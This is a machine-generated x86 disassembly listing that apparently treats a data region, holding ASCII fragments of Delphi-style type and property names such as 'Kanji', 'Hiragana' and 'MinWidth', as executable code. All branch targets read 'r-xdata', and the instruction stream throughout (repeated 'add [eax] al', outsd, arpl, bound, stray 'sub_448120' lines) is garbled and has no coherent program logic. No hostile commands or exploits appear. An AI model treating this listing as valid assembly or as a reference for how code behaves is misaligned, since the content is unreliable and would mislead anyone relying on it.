adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
mov ah 0x44
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
add [ edi + esi * 2 + 0x44 ] ebx
cmp [ edi + 0x44 ] dh
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
dec ebp
outsd
jne r-xdata
push esp
push esp
sar [ eax + 0x3004476 ] 0xa
ja r-xdata
jb r-xdata
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
jne r-xdata
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] cl
inc ebx
outsd
jne r-xdata
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] dl
nop
inc ecx
add [ edi + ecx * 4 ] ah
inc ecx
add [ ebp + esi * 4 + 0x44 ] bh
imul ebp [ esi + 0x74 ] 0x657a6953
inc eax
add [ eax ] al
xor eax 0x35040040
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
dec ebp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
add al 0x77
insb
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc edx
add [ esi + esi * 4 - 0x6dcbffbc ] bl
inc ebp
add [ eax ] dl
mov bh 0x44
add [ edx + edx * 4 + 0x45 ] bl
add [ eax - 0x6e ] dh
inc ebp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add al dh
xchg edx eax
inc ebp
add al bh
mov bh 0x44
add al bh
xchg edx eax
inc ebp
add [ ecx + edi * 4 ] cl
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 + 0x54120044 ] ch
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add ah bh
xor al 0x40
outsb
je r-xdata
add [ eax ] cl
das
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
popad
js r-xdata
jb r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al bh
mov es [ ecx ]
test al 0xb4
inc esp
add al 0x35
outsd
insb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
popad
js r-xdata
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add [ ebp + 0x75a80040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] ah
inc esp
add [ eax + eax ] bl
add [ eax ] al
dec esp
mov eax [ ebp ]
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
push eax
js r-xdata
jb r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
imul esp [ edi + 0x68 ] 0x4477b874
imul esp [ gs : edi + 0x68 ] 0x4477b874
add [ eax + eax ] cl
add bh bh
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
jae r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
inc ebx
outsd
jbe r-xdata
jae r-xdata
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x447984c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
mov eax 0x10004477
add [ eax + eax ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x4477b874
jb r-xdata
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x7760c08b
inc esp
add [ ebx ] al
add [ eax ] al
add [ edi + esi * 2 + 0x44 ] bl
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
je r-xdata
push ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
mov eax 0xc004477
add [ eax ] al
push eax
mov ah 0x44
ja r-xdata
ja r-xdata
imul ebp [ esi + 0x74 ] 0x44782473
add [ ecx + 0x40041 ] bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsb
mov eax eax
pushad
ja r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
dec esp
popad
add [ esp + esi * 4 + 0x44 ] ch
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc esp
add eax 0x0
add [ ecx ] al
add [ eax ] al
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
insd
dec ebp
popad
outsb
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ edi + esi * 2 ] al
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ eax ] dh
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
arpl [ eax + eax + 0x6 ] si
lea eax [ eax ]
or al 0x79
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
push eax
mov ah 0x44
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
add [ eax ] dl
inc esp
outsd
insb
jae r-xdata
add [ eax + 0x6004477 ] ch
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push eax
mov ah 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
add [ eax + 0x8004477 ] bh
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
pop edx
inc ecx
add [ eax + r-xdata ] dl
push 0x30004010
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + esi * 2 + 0x10000044 ] dh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
cmp al 0x10
outsb
je r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x11
inc eax
add ah dl
jo r-xdata
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add al 0x11
inc eax
add [ eax ] dh
pop edx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x79e80040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
pop es
jb r-xdata
add [ eax + 0x800447b ] ah
or eax 0x646e4554
inc esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
aam 0x70
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x7a700040 ] cl
arpl [ ebx + 0x4f ] bp
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ ecx + 0x7 ] ebx
add al 0x11
inc eax
add ah dh
jae r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add ah bh
jpo r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
jb r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x7b580040 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
adc [ eax ] al
mov ah 0x76
inc esp
add [ eax ] al
adc [ eax ] al
nop
clc
jpe r-xdata
inc esp
add [ eax ] cl
push cs
push esp
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
dec edi
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x7c640040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ eax ] bh
jbe r-xdata
je r-xdata
push esp
inc esp
jb r-xdata
add [ eax ] cl
push cs
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
jb r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
je r-xdata
push ebx
add [ eax ] dh
pop edx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
popad
jb r-xdata
outsb
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jb r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + esi * 2 + 0x10000044 ] dh
inc eax
add [ eax + r-xdata ] dl
jbe r-xdata
jbe r-xdata
inc ebp
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
hlt
popad
insb
inc eax
add ah dh
jae r-xdata
add al 0x11
outsb
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ ebx + eax * 4 + 0x44 ] cl
add [ ebx + ecx * 4 ] ah
inc esp
add [ eax ] al
adc [ eax ] al
pushad
jge r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ebx + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp [ esi + 0x44 ] bh
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
inc ebx
jpe r-xdata
add ah dh
jae r-xdata
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x447fc0c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x447f38c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
insb
add [ ebp + edi * 2 + 0x11080044 ] ch
push esp
inc edi
je r-xdata
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sar [ edi + 0x44 ] 0x0
or [ esi ] dl
outsb
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7f ] bh
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
test al 0x7e
inc esp
add [ eax ] cl
jb r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
dec esp
add [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x447e38c0 ] cl
outsb
je r-xdata
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] al
test [ edi + 0x41 ] ch
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add eax 0x65530608
outsb
jb r-xdata
add ah cl
push ss
jo r-xdata
add [ edi + ebp * 2 + 0x16cc0041 ] al
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
lea eax [ eax ]
fadd [ eax + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ fs : eax + eax + 0x50 ] 0x4483
jbe r-xdata
add [ edx - 0x7d ] al
inc esp
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] dh
pop edx
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] dh
pop edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xor al 0x80
inc esp
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ edx + edi * 4 ] ah
inc esp
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + edi * 4 + 0x44 ] cl
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax - 0x3ffbb45 ] dl
retn 0x44
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_448120
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_448340
inc esp
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
insb
nop
push eax
add [ eax + eax + 0x7 ] 0x8
push esp
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsd
insb
fadd [ eax + 0x70800044 ]
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
[ eax + eax * 8 ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x446fe474
add [ eax ] bh
add bh bh
or dl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
push [ ecx + eax * 8 - 0x16dfffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jae r-xdata
mov esp 0x10044bf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add bh bh
add [ edx + edx * 4 ] dh
inc ebp
add [ eax ] dl
mov bh 0x44
add [ edx + edx * 4 + 0x45 ] bl
add al dh
xor al 0x40
add ah bh
add [ eax + eax ] ah
add [ eax ] al
pop esp
jne r-xdata
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
dec eax
rol [ eax + eax + 0x20 ] 0xe9
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xor al 0x40
outsd
outsb
je r-xdata
add bh bh
mov ah 0xc1
inc esp
add [ eax ] ah
jmp r-xdata
jb r-xdata
dec esp
add [ eax ] al
push r-xdata
adc [ eax ] al
inc esp
add [ eax ] al
jmp eax
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add [ ebp + eax * 4 + 0x44 ] ah
jns r-xdata
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esi + esi * 4 - 0x6dcbffbc ] bl
js r-xdata
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
cld
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
or al al
inc esp
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0xff0000 ]
jmp r-xdata
insb
inc ebp
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
inc esp
add ah ch
pop ss
inc edx
add [ eax + 0x200044b7 ] dh
sbb [ edx ] al
pop esp
mov eax 0x17700044
inc edx
outsd
jb r-xdata
add al cl
in eax dx
inc esp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
